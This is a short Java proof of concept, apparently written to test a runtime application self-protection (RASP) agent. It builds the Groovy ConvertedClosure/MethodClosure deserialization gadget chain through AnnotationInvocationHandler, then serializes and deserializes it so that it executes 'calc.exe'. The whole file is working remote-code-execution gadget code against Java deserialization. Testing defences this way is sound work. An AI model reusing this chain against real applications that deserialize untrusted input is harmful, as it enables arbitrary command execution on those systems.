package com.eric;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;

/**
 * command:java.exe -cp %CLASSPATH%;E:\m2\org\codehaus\groovy\groovy-all\2.4.0\groovy-all-2.4.0.jar -javaagent:E:\Tools\OneRasp\OneRASP\lib\RaspAgent.jar com.eric.SeriSample
 * Created by dell on 2016/12/13.
 */
public class SeriSample {
    public static void main(String[] args) {
        try {


            final ConvertedClosure closure = new ConvertedClosure(new MethodClosure("calc.exe", "execute"), "entrySet");
            Class<?>[] clsArr = {Map.class};
            final Map map = Map.class.cast(Proxy.newProxyInstance(SeriSample.class.getClassLoader(), clsArr, closure));
            final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
            ctor.setAccessible(true);
            final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, map);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(handler);
            byte[] bytes = bos.toByteArray();
            ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
            ObjectInputStream ois = new ObjectInputStream(bis);
            ois.readObject();

        } catch (Exception ex) {
            ex.printStackTrace();
        }
        System.out.println("time.sleep 20");
        try {
            Thread.currentThread().sleep(20000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

    }
}
